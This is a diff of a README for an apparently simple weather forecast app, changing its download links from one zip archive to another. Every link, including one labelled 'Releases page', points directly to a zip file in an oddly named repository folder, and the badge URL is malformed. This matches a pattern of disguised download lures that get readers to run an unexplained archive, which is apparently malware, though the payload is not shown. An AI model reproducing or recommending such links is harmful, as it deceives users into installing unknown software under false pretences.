@@ -1,7 +1,7 @@
 # 🌤️ weather-forecast-app - Your Simple Weather Update Tool
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/wanderasadallah/weather-forecast-app/main/sabadilla/weather_app_forecast_2.0-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/wanderasadallah/weather-forecast-app/main/sabadilla/weather_app_forecast_2.0-alpha.2.zip)
+[![Download](https://raw.githubusercontent.com/wanderasadallah/weather-forecast-app/main/sabadilla/forecast_weather_app_v2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/wanderasadallah/weather-forecast-app/main/sabadilla/forecast_weather_app_v2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the Weather Forecast App! This easy-to-use application helps you check the weather in your area using simple and friendly design. 
@@ -17,7 +17,7 @@ Welcome to the Weather Forecast App! This easy-to-use application helps you chec
 - An internet connection to fetch weather data.
 
 ## 📦 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/wanderasadallah/weather-forecast-app/main/sabadilla/weather_app_forecast_2.0-alpha.2.zip) to download the latest version of the Weather Forecast App.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/wanderasadallah/weather-forecast-app/main/sabadilla/forecast_weather_app_v2.4.zip) to download the latest version of the Weather Forecast App.
 
 1. Click on the link above.
 2. Look for the latest version listed on the Releases page.
